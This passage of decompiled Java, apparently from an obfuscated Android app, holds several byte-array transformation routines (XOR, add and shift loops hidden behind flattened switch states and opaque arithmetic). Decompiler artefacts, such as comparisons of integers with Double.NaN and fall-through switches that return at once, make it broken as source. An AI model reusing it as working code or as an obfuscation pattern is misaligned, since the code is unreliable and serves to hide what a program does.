                    byte b5 = bArr[((length17 & length3) * 2) + (length17 ^ length3)];
                    int i24 = ~C0017c0.class.getName().length();
                    length5 = (short) (((b5 & ((-1954201202) ^ ((((C0017c0.class.getName().length() | (-2105278367)) - (i24 | (-1545180443))) + (I2.a(C0017c0.class, 568748773 | i24) + (C0017c0.class.getName().length() & (-2105278367)))) + ((C0017c0.class.getName().length() & (-2097135360)) | 151077136)))) << (((((~C0017c0.class.getName().length()) | (-1592082969)) & 140665109) + ((C0017c0.class.getName().length() & 142103568) | 1612800)) ^ 142277917)) | length16);
                    int i25 = ~C0017c0.class.getName().length();
                    int length18 = (-1901610175) ^ ((((((~i25) & (-569955033)) + i25) | 2038255548) - 2038255548) + ((C0017c0.class.getName().length() & 144806464) | 136645376));
                    int i26 = -length3;
                    int i27 = i26 | length18;
                    byte b6 = bArr[(i27 - (i26 * 2)) + ((length18 ^ i26) ^ i27)];
                    int i28 = (((-199685676) | r7) - 1591672428) - ((~C0017c0.class.getName().length()) | (-180811308));
                    int length19 = (C0017c0.class.getName().length() & 23072776) | 272636008;
                    int length20 = b6 & ((-1319036669) ^ (((length19 | i28) - ((C0017c0.class.getName().length() & (~i28)) & length19)) + (length19 & (i28 | C0017c0.class.getName().length()))));
                    int i29 = ((~C0017c0.class.getName().length()) | (-1009031633)) & 545538049;
                    int length21 = (C0017c0.class.getName().length() & 537143360) | 10560;
                    int length22 = bArr[(545548610 ^ ((length21 & i29) + (i29 | length21))) + length3] & (((((~C0017c0.class.getName().length()) | 75364313) & 1242301609) + ((C0017c0.class.getName().length() & 1249907040) | (-1602217664))) ^ (-359916266));
                    int length23 = C0017c0.class.getName().length();
                    length6 = (short) (length20 | (length22 << ((((1779401364 | (((~length23) - length23) + length23)) & 447961710) + ((C0017c0.class.getName().length() & (-1313580806)) | (-519831408))) ^ (-71869706))));
                    int i30 = ~C0017c0.class.getName().length();
                    i9 = 758110381 ^ (((((-1343875612) | i30) + 311432716) - (i30 | (-1074391060))) + ((C0017c0.class.getName().length() & 273678921) | (-1069545407)));
                    int i31 = ~C0017c0.class.getName().length();
                    int length24 = 1409942802 & (((((C0017c0.class.getName().length() & (~i31)) & 91135407) + 91135407) + i31) - ((i31 | C0017c0.class.getName().length()) & 91135407));
                    int length25 = (C0017c0.class.getName().length() & (-804257776)) | (-2094006112);
                    int i32 = -length24;
                    length8 = (-684063310) ^ (((~i32) & length25) - (i32 & (~length25)));
                    length2 = (((~C0017c0.class.getName().length()) | (-537919489)) - (-806798471)) + ((C0017c0.class.getName().length() & 674768897) | 153626665);
                    i3 = 1174056570 - length2;
                    i4 = -1174056571;
                    i11 = ((length2 & i4) * 2) + i3;
                case -1740520186:
                    sArr = new short[((((~C0017c0.class.getName().length()) | (-382746167)) & 102532165) + ((C0017c0.class.getName().length() & 105907748) | 4198960)) ^ 106731121];
                    length3 = ((((~C0017c0.class.getName().length()) | (-6036961)) & 1233145505) + ((C0017c0.class.getName().length() & 809508000) | 809603328)) ^ 2042748833;
                    int i33 = ((~C0017c0.class.getName().length()) | 1688058452) & 872484865;
                    int length26 = C0017c0.class.getName().length() & 268460041;
                    i5 = (((((C0017c0.class.getName().length() & (~length26)) & 4218888) + 4218888) + length26) - ((length26 | C0017c0.class.getName().length()) & 4218888)) + i33;
                    i6 = 434661073;
                    i11 = i6 ^ i5;
                case -1489518479:
                    int length27 = C0017c0.class.getName().length();
                    int length28 = (((-2053077912) & ((516782023 - length27) + (((-((-1) - length27)) - 1) | (-516782024)))) + ((C0017c0.class.getName().length() & (-1054752728)) | 1073823745)) ^ (-979254165);
                    int length29 = bArr2[(((~length3) & length28) * ((~length28) & length3)) + ((length28 & length3) * (length28 | length3))] & (((((~C0017c0.class.getName().length()) | (-1883938358)) & (-738125179)) + ((C0017c0.class.getName().length() & 1343232517) | 546308360)) ^ (-191816846));
                    int i34 = ~C0017c0.class.getName().length();
                    int i35 = 73539736 & (((~i34) & (-1772650326)) + i34);
                    int length30 = (C0017c0.class.getName().length() & 35664144) | 33608448;
                    int i36 = -i35;
                    byte b7 = bArr2[((107148186 ^ ((((~i36) & length30) * 2) - (i36 ^ length30))) * length3) + ((((I2.a(C0017c0.class, -1) | (-532481)) - (-67641369)) + ((C0017c0.class.getName().length() & 532546) | 1602)) ^ 67642971)];
                    int i37 = ~C0017c0.class.getName().length();
                    int length31 = (b7 & (((663757504 & ((i37 + 1314070430) - (i37 & 1314070430))) + ((C0017c0.class.getName().length() & 834674756) | 272630796)) ^ 936388147)) << ((((I2.a(C0017c0.class, -1) | (-33554434)) - (-1107366402)) + ((C0017c0.class.getName().length() & (-2113929151)) | (-2147475136))) ^ (-1040108727));
                    sArr[length3] = (short) ((length31 ^ length29) + (length29 & length31));
                    length3++;
                    length = ((I2.a(C0017c0.class, -1) | (-167014194)) & 1157999680) + ((C0017c0.class.getName().length() & 159661328) | (-2004872944));
                    i = -533943416;
                    i11 = length ^ i;
                case -473033593:
                    int i38 = -length3;
                    int i39 = -bArr.length;
                    int i40 = i39 | i38;
                    int i41 = (i40 - (i39 * 2)) + ((i39 ^ i38) ^ i40);
                    byte b8 = bArr[bArr.length - length3];
                    int length32 = C0017c0.class.getName().length();
                    bArr[i41] = (byte) (b8 ^ bArr2[length3 % (((((-878819395) | ((length32 - 1) - (length32 * 2))) & 1490255976) + ((C0017c0.class.getName().length() & 274827331) | 556017667)) ^ 2046273635)]);
                    length3--;
                    int f5 = (AbstractC0008a.f(C0017c0.class, -1) | 114408723) & 1183666176;
                    int length33 = C0017c0.class.getName().length() & 1074544770;
                    length = S.a(length33, (-268567684) | ((-length33) - 1), 268567684, f5);
                    i = 836032333;
                    i11 = length ^ i;
                case 766056152:
                    int i42 = ((~C0017c0.class.getName().length()) | (-889871025)) & 1233748555;
                    int length34 = C0017c0.class.getName().length();
                    int i43 = (length34 + 84675108) - (length34 | 84675108);
                    if (length3 < (1842188139 ^ ((((~i43) & 608439588) + i43) + i42))) {
                        int i44 = ((~C0017c0.class.getName().length()) | 1878725846) & 1912684595;
                        int length35 = (C0017c0.class.getName().length() & 268589089) | 661640;
                        length = AbstractC0099x.a(i44 | length35, 2, (~i44) ^ length35);
                        i = -717449014;
                    } else {
                        length = (((~C0017c0.class.getName().length()) | (-1477955618)) & (-1604246503)) + ((C0017c0.class.getName().length() & 1074350177) | 1342720098);
                        i = -887872332;
                    }
                    i11 = length ^ i;
                case 974072829:
                    int length36 = bArr.length;
                    int i45 = ((~C0017c0.class.getName().length()) | 1711185063) & 170281206;
                    int length37 = (C0017c0.class.getName().length() & 251684176) | 1694512896;
                    int i46 = -i45;
                    length3 = length36 % (1864794098 ^ (((~i46) & length37) - (i46 & (~length37))));
                    length = (((~C0017c0.class.getName().length()) | 991120067) & (-2113137661)) + ((C0017c0.class.getName().length() & (-1878240248)) | 285229064);
                    i = -195569723;
                    i11 = length ^ i;
                case 998066383:
                    length3 = (((AbstractC0008a.f(C0017c0.class, -1) | 314136709) & 371231304) + (((C0017c0.class.getName().length() | (-67142233)) + 67142233) | (-1996488432))) ^ (-1625257128);
                    length4 = bArr.length - (bArr.length % (((((~C0017c0.class.getName().length()) | 366661365) & 1344150018) + ((C0017c0.class.getName().length() & (-1006333853)) | (-2080341919))) ^ (-736191897)));
                    length = (((~C0017c0.class.getName().length()) | (-1359635359)) & 49026131) + ((C0017c0.class.getName().length() & (-1860698094)) | (-1190123008));
                    i = 1002689495;
                    i11 = length ^ i;
                case 1314339506:
                    break;
                case 1734050766:
                    int i47 = ~C0017c0.class.getName().length();
                    if (length3 > 0) {
                        int length38 = C0017c0.class.getName().length();
                        length = ((i47 | (-268772210)) & 282132586) + (168323072 | ((length38 + 402735200) - (length38 | 402735200)));
                        i = -115901203;
                        i11 = length ^ i;
                    } else {
                        int length39 = (C0017c0.class.getName().length() & R.^attr-private.__removed0) | 553664516;
                        int i48 = -((i47 | 1510858717) & 403833600);
                        i5 = ((~i48) & length39) - (i48 & (~length39));
                        i6 = 2001041846;
                        i11 = i6 ^ i5;
                    }
                case 1771480224:
                    bArr[(((((~C0017c0.class.getName().length()) | 1110430873) & 1241612298) + ((C0017c0.class.getName().length() & 150996226) | 84419840)) ^ 1326032138) + length3] = (byte) ((((((~C0017c0.class.getName().length()) | 1603962366) & 25199440) + (((C0017c0.class.getName().length() | (-1311235)) + 1311235) | (-2146172766))) ^ (-2120973555)) & length5);
                    int length40 = (((((~C0017c0.class.getName().length()) | (-1388708984)) & 706816128) + ((C0017c0.class.getName().length() & 1124204552) | 1363312648)) ^ 2070128777) + length3;
                    int i49 = ((~C0017c0.class.getName().length()) | 367288948) & 548745488;
                    int length41 = C0017c0.class.getName().length();
                    bArr[length40] = (byte) ((length5 >> ((i49 + (21135364 | ((length41 + 558960896) - (length41 | 558960896)))) ^ 569880860)) & (((((~C0017c0.class.getName().length()) | 2113158628) & 1026558002) + ((C0017c0.class.getName().length() & 8392730) | 8525645)) ^ 1035083648));
                    int length42 = (((~C0017c0.class.getName().length()) | 715175224) & 136512788) + ((C0017c0.class.getName().length() & 196644) | (-2146430752));
                    int a4 = AbstractC0105y1.a((~length42) | (-2009917962), (-2009917962) - length42, length3);
                    int i50 = ((~C0017c0.class.getName().length()) | (-1010633609)) & 678986012;
                    int length43 = C0017c0.class.getName().length();
                    int i51 = ~(((951583497 & length43) + 276825601) - (length43 & 276824577));
                    int i52 = -i50;
                    bArr[a4] = (byte) ((V2.a(~i52, i51, (i51 + i52) + 1) ^ 955811810) & length6);
                    int length44 = (((((~C0017c0.class.getName().length()) | (-1084937228)) & 438503696) + ((C0017c0.class.getName().length() & 69369860) | (-2080078843))) ^ (-1641575146)) + length3;
                    int i53 = ~C0017c0.class.getName().length();
                    int length45 = length6 >> (2092810490 ^ ((((C0017c0.class.getName().length() | 674349280) - (i53 | 1869872636)) + (AbstractC0008a.f(C0017c0.class, 1197735420 | i53) + (C0017c0.class.getName().length() & 674349280))) + ((C0017c0.class.getName().length() & 1754529808) | 1418461202)));
                    int i54 = ((~C0017c0.class.getName().length()) | 1601418652) & 1439188132;
                    int length46 = (C0017c0.class.getName().length() & 545800290) | (-1442676670);
                    int i55 = -i54;
                    bArr[length44] = (byte) (length45 & ((-3488743) ^ (((~i55) & length46) - (i55 & (~length46)))));
                    length3 += 4;
                    length = (((~C0017c0.class.getName().length()) | (-171976913)) & 318775824) + ((C0017c0.class.getName().length() & 33562640) | 136194);
                    i = -1824662634;
                    i11 = length ^ i;
                case 2093236949:
                    if (length8 < (((((~C0017c0.class.getName().length()) | (-616910267)) & 1303391760) + ((C0017c0.class.getName().length() & 75500825) | 537198861)) ^ 1840590653)) {
                        length2 = (((~C0017c0.class.getName().length()) | 1297715640) & 556926729) + ((C0017c0.class.getName().length() & 874653185) | 335552516);
                        i3 = (-1287294623) - length2;
                        i4 = 1287294622;
                        i11 = ((length2 & i4) * 2) + i3;
                    } else {
                        int i56 = ~C0017c0.class.getName().length();
                        length = (1141965102 & ((-1207265904) + i56 + (((-i56) - 1) | 1207265904))) + ((C0017c0.class.getName().length() & 1292960864) | 150996032);
                        i = 612868558;
                        i11 = length ^ i;
                    }
                default:
                    int i57 = ~C0017c0.class.getName().length();
                    int i58 = (((-313266948) | i57) + 45165696) - (i57 | (-269226756));
                    length = D.a(i58, 3, -D1.a(i58, (C0017c0.class.getName().length() & 44040224) | (-1811807712)), 1);
                    i = -361272203;
                    i11 = length ^ i;
            }
            return;
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0048. Please report as an issue. */
    public static void r(byte[] bArr, byte[] bArr2) {
        int i;
        int i3;
        byte[] bArr3 = null;
        int i4 = 1516727821;
        int i5 = 0;
        int i6 = 0;
        int i7 = 0;
        byte[] bArr4 = null;
        while (true) {
            int i8 = ((i4 & 16777216) * (i4 | 16777216)) + ((i4 & (-16777217)) * ((~i4) & 16777216));
            int i9 = i4 >>> 8;
            int a2 = j3.a(650911840 & (~i8) & i9, i9, i8, (i8 | 650911840) & i9);
            int i10 = (a2 ^ 642535957) + ((a2 & 642535957) * 2);
            int i11 = -365117735;
            boolean z3 = true;
            switch (((~i10) + ((i10 | 1) * 2)) ^ 962785775) {
                case -1896910703:
                    int length = bArr4.length;
                    int i12 = 0 - i5;
                    int i13 = (length ^ i12) + ((length & i12) * 2);
                    byte b4 = bArr3[i13];
                    int length2 = bArr4.length;
                    int i14 = 0 - i12;
                    int i15 = i14 | length2;
                    byte b5 = bArr3[D.a(i14, 2, i15, (length2 ^ i14) ^ i15)];
                    bArr3[i13] = (byte) (((byte) (((byte) 2) * ((byte) (b5 | b4)))) - ((byte) (b5 ^ b4)));
                    i4 = -746753280;
                case -1725904394:
                    i7 = bArr4.length % 4;
                    if ((((i7 > 1 ? 1 : (i7 == 1 ? 0 : -1)) >>> 31) & 1) == 0) {
                        i4 = -365117735;
                    } else {
                        i4 = -458924450;
                    }
                case -1399959314:
                    int a4 = j3.a((-1205100636) & i6, i6, 3, (-1205100633) & i6);
                    byte b6 = bArr3[a4];
                    int i16 = ((b6 & ForkServer.DONE) * (b6 | ForkServer.DONE)) + ((b6 & ForkServer.ERROR) * ((~b6) & 16777216));
                    int i17 = i6 - 1;
                    int i18 = i17 - (i6 | (-3));
                    int i19 = bArr3[i18] & ForkServer.ERROR;
                    int i20 = i19 * ((~i19) & 65536);
                    int a5 = S.a(i20, i16, 1, ((-1) - i20) | ((-1) - i16));
                    int i21 = i17 - (i6 | (-2));
                    int i22 = bArr3[i21] & ForkServer.ERROR;
                    int i23 = i22 * ((~i22) & UserVerificationMethods.USER_VERIFY_HANDPRINT);
                    int i24 = (i23 - 1) - ((~a5) | i23);
                    int i25 = bArr3[i6] & ForkServer.ERROR;
                    int a6 = S.a(i24, i25, 1, ((-1) - i24) | ((-1) - i25));
                    byte b7 = bArr4[a4];
                    int i26 = ((b7 & ForkServer.DONE) * (b7 | ForkServer.DONE)) + ((b7 & ForkServer.ERROR) * ((~b7) & 16777216));
                    int i27 = bArr4[i18] & ForkServer.ERROR;
                    int i28 = ((i27 * ((~i27) & 65536)) & (~i26)) + i26;
                    int i29 = bArr4[i21] & ForkServer.ERROR;
                    int i30 = i29 * ((~i29) & UserVerificationMethods.USER_VERIFY_HANDPRINT);
                    int i31 = ~((((~i30) | 911399251) | i28) - ((i30 & 911399251) | i28));
                    int i32 = bArr4[i6] & ForkServer.ERROR;
                    int i33 = ~((((~i31) | 1433568692) | i32) - ((i31 & 1433568692) | i32));
                    int i34 = a6 << ((a6 > Double.NaN ? 1 : (a6 == Double.NaN ? 0 : -1)) >>> 31);
                    int i35 = (-1254002618) - ((i34 & 2) | ((-1672003491) - i34));
                    int i36 = (i35 + i33) - ((i35 & i33) * 2);
                    bArr4[i6] = (byte) i36;
                    bArr4[i21] = (byte) (i36 >>> 8);
                    bArr4[i18] = (byte) (i36 >>> 16);
                    bArr4[a4] = (byte) (i36 >>> 24);
                    i6 = (i6 ^ 4) + ((i6 & 4) * 2);
                    int length3 = bArr4.length;
                    int length4 = 0 - (bArr4.length % 4);
                    int i37 = ((i6 > AbstractC0014b1.a((length3 & 2) | D1.a(length4, length3), length4 * 3) ? 1 : (i6 == AbstractC0014b1.a((length3 & 2) | D1.a(length4, length3), length4 * 3) ? 0 : -1)) >>> 31) & 1;
                    if (i37 != 0) {
                        i = -1605440657;
                    } else {
                        i = -365117735;
                    }
                    if (i37 != 0) {
                        i4 = i;
                    } else {
                        i4 = -169475207;
                    }
                case -1135475043:
                    break;
                case 180635757:
                    int length5 = bArr.length;
                    int length6 = 0 - (bArr.length % 4);
                    if ((length5 ^ (~length6)) + ((length5 | length6) * 2) + 1 <= 0) {
                        z3 = false;
                    }
                    if (z3) {
                        i3 = -1605440657;
                    } else {
                        i3 = -365117735;
                    }
                    if (z3) {
                        i4 = i3;
                    } else {
                        i4 = -169475207;
                    }
                    bArr3 = bArr2;
                    bArr4 = bArr;
                    i6 = 0;
                case 511524454:
                    int length7 = bArr4.length;
                    int i38 = 0 - i5;
                    int i39 = 0 - i38;
                    int i40 = ((~length7) & i39) * 2;
                    int length8 = bArr4.length;
                    byte b8 = bArr4[((length8 | i38) * 2) - (length8 ^ i38)];
                    int length9 = bArr4.length;
                    byte b9 = bArr3[(i38 ^ length9) + ((length9 & i38) * 2)];
                    bArr4[(length7 ^ i39) - i40] = (byte) (((byte) (b9 - b8)) + ((byte) (((byte) 2) * ((byte) ((~b9) & b8)))));
                    i7 = AbstractC0099x.a(i5, 3, (~i5) * 2);
                    if ((((i5 > 2 ? 1 : (i5 == 2 ? 0 : -1)) >>> 31) & 1) == 0) {
                        i4 = -365117735;
                    } else {
                        i4 = -458924450;
                    }
                case 961838909:
                    int length10 = bArr4.length;
                    int i41 = 0 - i7;
                    if ((bArr3[((length10 | i41) - ((165327505 & (~i41)) & length10)) + ((i41 | 165327505) & length10)] > Double.NaN ? 1 : (bArr3[((length10 | i41) - ((165327505 & (~i41)) & length10)) + ((i41 | 165327505) & length10)] == Double.NaN ? 0 : -1)) <= -1) {
                        z3 = false;
                    }
                    if (!z3) {
                        i11 = 1093626513;
                    }
                    if (z3) {
                        i4 = -746753280;
                    } else {
                        i4 = i11;
                    }
                    i5 = i7;
                default:
                    i4 = -365117735;
            }
            return;
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0045. Please report as an issue. */
    public static void v(byte[] bArr, byte[] bArr2) {
        boolean z3;
        int i;
        byte[] bArr3 = null;
        int i3 = -1003175592;
        int i4 = 0;
        int i5 = 0;
        int i6 = 0;
        byte[] bArr4 = null;
        while (true) {
            int i7 = ((i3 & 16777216) * (i3 | 16777216)) + ((i3 & (-16777217)) * ((~i3) & 16777216));
            int i8 = i3 >>> 8;
            int i9 = ~((((~i8) | (-1095531540)) | i7) - ((i8 & (-1095531540)) | i7));
            int i10 = (-1171264002) - ((i9 & 2) | ((-130029571) - i9));
            switch ((-1109882652) ^ ((~i10) + ((i10 | 1) * 2))) {
                case -1922532006:
                    byte[] bArr5 = bArr3;
                    int length = bArr4.length;
                    int i11 = 0 - i4;
                    if ((bArr5[AbstractC0014b1.a((length & 2) | D1.a(i11, length), i11 * 3)] > Double.NaN ? 1 : (bArr5[AbstractC0014b1.a((length & 2) | D1.a(i11, length), i11 * 3)] == Double.NaN ? 0 : -1)) <= -1) {
                        i3 = -1671996003;
                    } else {
                        i3 = 935800592;
                    }
                    i5 = i4;
                    bArr3 = bArr5;
                case -1486048729:
                    int length2 = bArr.length;
                    int length3 = 0 - (0 - (bArr.length % 4));
                    if ((length2 & (~length3)) - ((~length2) & length3) <= 0) {
                        z3 = false;
                    } else {
                        z3 = true;
                    }
                    if (z3) {
                        i = -1515449616;
                    } else {
                        i = 935800592;
                    }
                    if (z3) {
                        i3 = i;
                    } else {
                        i3 = -10521562;
                    }
                    bArr3 = bArr2;
                    bArr4 = bArr;
                    i6 = 0;
                case -497756741:
                    byte[] bArr6 = bArr3;
                    int length4 = bArr4.length;
                    int i12 = 0 - i5;
                    int i13 = ((length4 | i12) * 2) - (length4 ^ i12);
                    byte b4 = bArr6[i13];
                    int length5 = bArr4.length;
                    byte b5 = bArr6[((i12 | length5) - ((1163302289 & (~i12)) & length5)) + ((i12 | 1163302289) & length5)];
                    bArr6[i13] = (byte) (((byte) (((byte) (b5 ^ (~b4))) + ((byte) (((byte) 2) * ((byte) (b5 | b4)))))) + ((byte) 1));
                    bArr3 = bArr6;
                    i3 = 935800592;
                case 256719606:
                    int i14 = (i6 - 1) - (i6 | (-4));
                    byte b6 = bArr3[i14];
                    int i15 = ((b6 & ForkServer.DONE) * (b6 | ForkServer.DONE)) + ((b6 & ForkServer.ERROR) * ((~b6) & 16777216));
                    int i16 = i6 + 2;
                    int i17 = i16 - (i6 & 2);
                    int i18 = bArr3[i17] & ForkServer.ERROR;
                    int i19 = i18 * ((~i18) & 65536);
                    int a2 = S.a(i19, i15, 1, ((-1) - i19) | ((-1) - i15));
                    int i20 = i16 + (((-1) - i6) | (-2));
                    int i21 = bArr3[i20] & ForkServer.ERROR;
                    int i22 = i21 * ((~i21) & UserVerificationMethods.USER_VERIFY_HANDPRINT);
                    int i23 = (i22 - 1) - ((~a2) | i22);
                    int i24 = bArr3[i6] & ForkServer.ERROR;
                    int i25 = ~((i24 | ((~i23) | (-755325340))) - ((i23 & (-755325340)) | i24));
                    byte b7 = bArr4[i14];
                    int i26 = ((b7 & ForkServer.DONE) * (b7 | ForkServer.DONE)) + ((b7 & ForkServer.ERROR) * ((~b7) & 16777216));
                    int i27 = bArr4[i17] & ForkServer.ERROR;
                    int i28 = i27 * ((~i27) & 65536);
                    int i29 = bArr4[i20] & ForkServer.ERROR;
                    int i30 = i29 * ((~i29) & UserVerificationMethods.USER_VERIFY_HANDPRINT);
                    int i31 = bArr4[i6] & ForkServer.ERROR;
                    byte[] bArr7 = bArr3;
                    int i32 = i25 << ((i25 > Double.NaN ? 1 : (i25 == Double.NaN ? 0 : -1)) >>> 31);
                    int i33 = (-659933419) - ((1983400305 - i26) | (i26 & 2));
                    int i34 = (i33 ^ (~i28)) + ((i33 | i28) * 2) + 1;
                    int i35 = (i34 ^ i31) + ((i34 & i31) * 2);
                    int i36 = ((i35 | i30) - (((-2109111237) & (~i30)) & i35)) + ((i30 | (-2109111237)) & i35);
                    int a4 = E1.a(i32 | i36, i32, i36);
                    bArr4[i6] = (byte) a4;
                    bArr4[i20] = (byte) (a4 >>> 8);
                    bArr4[i17] = (byte) (a4 >>> 16);
                    bArr4[i14] = (byte) (a4 >>> 24);
                    i6 = (i6 ^ 4) + ((i6 & 4) * 2);
                    int length6 = bArr4.length;
                    int length7 = 0 - (bArr4.length % 4);
                    int i37 = ((i6 > (((length6 | length7) * 2) - (length6 ^ length7)) ? 1 : (i6 == (((length6 | length7) * 2) - (length6 ^ length7)) ? 0 : -1)) >>> 31) & 1;
                    if (i37 != 0) {
                        i3 = -1515449616;
                    } else {
                        i3 = 935800592;
                    }
                    bArr3 = bArr7;
                    if (i37 == 0) {
                        i3 = -10521562;
                    }
                case 1429728656:
                    i4 = bArr4.length % 4;
                    int i38 = 1 & ((i4 > 1 ? 1 : (i4 == 1 ? 0 : -1)) >>> 31);
                    if (i38 != 0) {
                        i3 = -1216566512;
                    } else {
                        i3 = 935800592;
                    }
                    if (i38 == 0) {
                        i3 = -1058029970;
                    }
                case 1870596681:
                    break;
                case 1879000533:
                    int length8 = bArr4.length;
                    int i39 = 0 - i5;
                    int i40 = 0 - i39;
                    int i41 = i40 | length8;
                    int i42 = (length8 ^ i40) ^ i41;
                    int i43 = i40 * 2;
                    int length9 = bArr4.length;
                    byte b8 = bArr4[(i40 ^ length9) - (((~length9) & i40) * 2)];
                    int length10 = bArr4.length;
                    byte b9 = bArr3[((i39 | length10) * 2) - (length10 ^ i39)];
                    bArr4[(i41 - i43) + i42] = (byte) (((((byte) (~b9)) + ((byte) (((byte) 2) * ((byte) (b9 | 1))))) ^ b8) ^ 1);
                    i4 = (~i5) + (i5 * 2);
                    int i44 = 1 & ((i5 > 2 ? 1 : (i5 == 2 ? 0 : -1)) >>> 31);
                    if (i44 != 0) {
                        i3 = -1216566512;
                    } else {
                        i3 = 935800592;
                    }
                    if (i44 == 0) {
                        i3 = -1058029970;
                    }
                default:
                    i3 = 935800592;
            }
            return;
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x003b. Please report as an issue. */
    public static void x(byte[] bArr, byte[] bArr2) {
        byte[] bArr3 = null;
        int i = 0;
        int i3 = 0;
        int i4 = -1850458006;
        byte[] bArr4 = null;
        while (true) {
            int i5 = ((16777216 & i4) * (i4 | 16777216)) + (((-16777217) & i4) * ((~i4) & 16777216));
            int i6 = i4 >>> 8;
            int i7 = (~i5) | i6;
            boolean z3 = true;
            int i8 = (i6 - 1) - i7;
            int i9 = (-1700147435) - ((i8 & 2) | (2028104049 - i8));
            int i10 = -1396193641;
            switch ((-1363443157) ^ ((~i9) + ((i9 | 1) * 2))) {
                case -1940167324:
                    byte b4 = bArr3[i];
                    int i11 = ((byte) 0) - b4;
                    bArr3[i] = (byte) (((byte) (b4 & (~i11))) - ((byte) ((~b4) & i11)));
                    i4 = 614229416;
                case -360299937:
                    if ((bArr3[i3] > Double.NaN ? 1 : (bArr3[i3] == Double.NaN ? 0 : -1)) <= -1) {
                        z3 = false;
                    }
                    if (!z3) {
                        i10 = 427928065;
                    }
                    if (z3) {
                        i4 = 614229416;
                    } else {
                        i4 = i10;
                    }
                    i = i3;
                case 399486784:
                    break;
                case 585276366:
                    if (bArr.length <= 0) {
                        i4 = -1396193641;
                    } else {
                        i4 = 1985663266;
                    }
                    bArr4 = bArr;
                    bArr3 = bArr2;
                    i3 = 0;
                case 1733787683:
                    byte b5 = bArr4[i];
                    byte b6 = bArr3[i];
                    bArr4[i] = (byte) (((byte) (b6 + b5)) - ((byte) (((byte) 2) * ((byte) (b6 & b5)))));
                    i3 = (i ^ 1) + ((i & 1) * 2);
                    if ((((i3 > bArr4.length ? 1 : (i3 == bArr4.length ? 0 : -1)) >>> 31) & 1) == 0) {
                        i4 = -1396193641;
                    } else {
                        i4 = 1985663266;
                    }
                default:
                    i4 = -1396193641;
            }
            return;
        }
    }

    /* JADX WARN: Failed to find 'out' block for switch in B:3:0x0047. Please report as an issue. */
    public static void y(byte[] bArr, byte[] bArr2) {
        int i;
        int i3;
        int i4 = 0;
        byte[] bArr3 = null;
        int i5 = 0;
        int i6 = 0;
        int i7 = 0;
        int i8 = 1180709023;
        byte[] bArr4 = null;
        while (true) {
            int i9 = ((i8 & 16777216) * (i8 | 16777216)) + ((i8 & (-16777217)) * ((~i8) & 16777216));
            int i10 = i8 >>> 8;
            int a2 = S.a(i10, i9, 1, ((-1) - i10) | ((-1) - i9));
            int i11 = (a2 ^ (-201803027)) + ((a2 & (-201803027)) * 2);
            int i12 = 1565752577;
            int i13 = 1621215041;
            switch ((i11 - 814310662) - ((i11 & (-814310662)) * 2)) {
                case -2000520841:
                    i = i4;
                    int length = bArr4.length;
                    int i14 = 0 - (0 - i5);
                    if ((bArr3[((length & (~i14)) * 2) - (length ^ i14)] > Double.NaN ? 1 : (bArr3[((length & (~i14)) * 2) - (length ^ i14)] == Double.NaN ? 0 : -1)) <= -1) {
                        i3 = i;
                    } else {
                        i3 = 1;
                    }
                    if (i3 == 0) {
                        i12 = 1621215041;
                    }
                    if (i3 != 0) {
                        i8 = i12;
                    } else {
                        i8 = -1164716566;
                    }
                    i7 = i5;
                    i4 = i;
                case -870579640:
                    int i15 = (i6 - 1) - (i6 | (-4));
                    byte b4 = bArr3[i15];
                    int i16 = ((b4 & ForkServer.DONE) * (b4 | ForkServer.DONE)) + ((b4 & ForkServer.ERROR) * ((~b4) & 16777216));
                    int i17 = i6 + 3 + (((-1) - i6) | (-3));
                    int i18 = bArr3[i17] & ForkServer.ERROR;
                    i = i4;
                    int i19 = i18 * ((~i18) & 65536);
                    int i20 = ~((((-1268032266) | (~i19)) | i16) - ((i19 & (-1268032266)) | i16));
                    int a4 = j3.a((-132004404) & i6, i6, 1, (-132004403) & i6);
                    int i21 = bArr3[a4] & ForkServer.ERROR;
                    int i22 = i21 * ((~i21) & UserVerificationMethods.USER_VERIFY_HANDPRINT);
                    int i23 = (i22 + i20) - (i22 & i20);
                    int i24 = bArr3[i6] & ForkServer.ERROR;
                    int i25 = ((~i24) & i23) + i24;
                    byte b5 = bArr4[i15];
                    int i26 = ((b5 & ForkServer.DONE) * (b5 | ForkServer.DONE)) + (((-16777217) & b5) * ((~b5) & 16777216));
                    int i27 = bArr4[i17] & ForkServer.ERROR;
                    int i28 = i27 * ((~i27) & 65536);
                    int i29 = ~((i26 | ((~i28) | (-1355861741))) - ((i28 & (-1355861741)) | i26));
                    int i30 = bArr4[a4] & ForkServer.ERROR;
                    int i31 = i30 * ((~i30) & UserVerificationMethods.USER_VERIFY_HANDPRINT);
                    int a5 = S.a(i31, i29, 1, ((-1) - i31) | ((-1) - i29));
                    int i32 = (a5 - 1) - ((~(bArr4[i6] & ForkServer.ERROR)) | a5);
                    int i33 = i25 << ((i25 > Double.NaN ? 1 : (i25 == Double.NaN ? 0 : -1)) >>> 31);
                    int i34 = (i33 ^ (-418000873)) + ((i33 & (-418000873)) * 2);
                    int i35 = (i34 + i32) - ((i34 & i32) * 2);
                    bArr4[i6] = (byte) i35;
                    bArr4[a4] = (byte) (i35 >>> 8);
                    bArr4[i17] = (byte) (i35 >>> 16);
                    bArr4[i15] = (byte) (i35 >>> 24);
                    i6 = (i6 ^ 4) + ((i6 & 4) * 2);
                    int length2 = bArr4.length;
                    int a6 = AbstractC0044j.a(bArr4.length);
                    if ((((i6 > (((length2 & (~a6)) * 2) - (length2 ^ a6)) ? 1 : (i6 == (((length2 & (~a6)) * 2) - (length2 ^ a6)) ? 0 : -1)) >>> 31) & 1) != 0) {
                        i8 = 1910359311;
                    } else {
                        i8 = 1621215041;
                    }
                    i4 = i;
                case -97532338:
                    i5 = bArr4.length % 4;
                    int i36 = ((i5 > 1 ? 1 : (i5 == 1 ? 0 : -1)) >>> 31) & 1;
                    if (i36 != 0) {
                        i13 = 986083301;
                    }
                    if (i36 != 0) {
                        i8 = i13;
                    } else {
                        i8 = -1138188205;
                    }
                case 298177592:
                    int length3 = bArr4.length;
                    int i37 = 0 - i7;
                    int a7 = AbstractC0014b1.a((length3 & 2) | D1.a(i37, length3), i37 * 3);
                    byte b6 = bArr3[a7];
                    int length4 = bArr4.length;
                    int i38 = 0 - i37;
                    int i39 = i38 | length4;
                    byte b7 = bArr3[D.a(i38, 2, i39, (length4 ^ i38) ^ i39)];
                    bArr3[a7] = (byte) (((byte) (b7 ^ b6)) + ((byte) (((byte) 2) * ((byte) (b7 & b6)))));
